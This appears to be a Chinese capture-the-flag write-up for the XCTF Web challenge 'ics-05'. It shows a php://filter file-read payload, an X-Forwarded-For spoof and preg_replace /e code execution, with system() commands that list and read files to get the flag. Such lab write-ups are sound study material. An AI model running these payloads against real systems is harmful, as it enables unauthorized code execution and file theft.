# 攻防世界-Web-ics-05

**题目信息**  

![](https://upload-images.jianshu.io/upload_images/10148719-8fa0dcb903ccad14.png?imageMogr2/auto-orient/strip|imageView2/2/w/705/format/webp)

image

  
**知识点：  
文件包含漏洞  
PHP伪协议中的 [php://filter](https://links.jianshu.com/go?to=php%3A%2F%2Ffilter)  
preg_replace函数引发的命令执行漏洞**

**解析**  
打开题目场景以后，只有一个index.php的页面能点开，并且页面没有显示完全，该页面很可疑。  
查看源码发现?page=index，出现page这个get参数，联想到可能存在文件包含读源码的漏洞  

![](https://upload-images.jianshu.io/upload_images/10148719-f5fdb96a04c82317.png?imageMogr2/auto-orient/strip|imageView2/2/w/850/format/webp)

图片.png

  
尝试读取index.php的页面源码，通过php内置协议直接读取代码

```bash
?page=php://filter/read=convert.base64-encode/resource=index.php
```

![](https://upload-images.jianshu.io/upload_images/10148719-42c49efc6c19d205.png?imageMogr2/auto-orient/strip|imageView2/2/w/854/format/webp)

图片.png

> LFI漏洞的黑盒判断方法：  
> 单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。

base64解密之后，审计源码，分析得到如下关键部分

```php
<?php

//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试

if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}

?>
```

preg_replace函数

```php
函数作用：搜索subject中匹配pattern的部分， 以replacement进行替换。
$pattern: 要搜索的模式，可以是字符串或一个字符串数组。
$replacement: 用于替换的字符串或字符串数组。
$subject: 要搜索替换的目标字符串或字符串数组。
```

preg_replace函数存在命令执行漏洞  
此处明显考察的是preg_replace 函数使用 `/e`模式，导致代码执行的问题。

> /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。

也就是说，pat和sub有相同部分，rep的代码就会执行。

根据源码分析X-Forwarded-For改成127.0.0.1之后，GET进三个参数。然后调用了preg_replace函数。并且没有对pat进行过滤，所以可以传入"/e"触发漏洞  
我首先执行一下`phpinfo()`  

![](https://upload-images.jianshu.io/upload_images/10148719-e9eb1088e3e7acb6.png?imageMogr2/auto-orient/strip|imageView2/2/w/870/format/webp)

图片.png

  
果然成功执行  
然后使用`system("ls")`尝试获取文件目录  

![](https://upload-images.jianshu.io/upload_images/10148719-5c7c2e7c7fea933f.png?imageMogr2/auto-orient/strip|imageView2/2/w/892/format/webp)

图片.png

使用cd进入目标文件，并查看该文件夹下文件`system("cd%20s3chahahaDir%26%26+ls")`  
此处不能使用空格隔开，可用`%20`或者`+`代替，`%26%26`为`&&`，`&&`意思是当前面命令执行成功时，继续执行后面的命令。  

![](https://upload-images.jianshu.io/upload_images/10148719-8c0d078e4d38e389.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp)

image

  
看到flag文件  
继续进入查看`system("cd%20s3chahahaDir/flag%26%26+ls")`  

![](https://upload-images.jianshu.io/upload_images/10148719-8f96e5774fa306aa.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp)

image

  
看到flag.php,使用cat命令查看flag.php中的内容  

![](https://upload-images.jianshu.io/upload_images/10148719-c364b28973bf74d7.png?imageMogr2/auto-orient/strip|imageView2/2/w/901/format/webp)

图片.png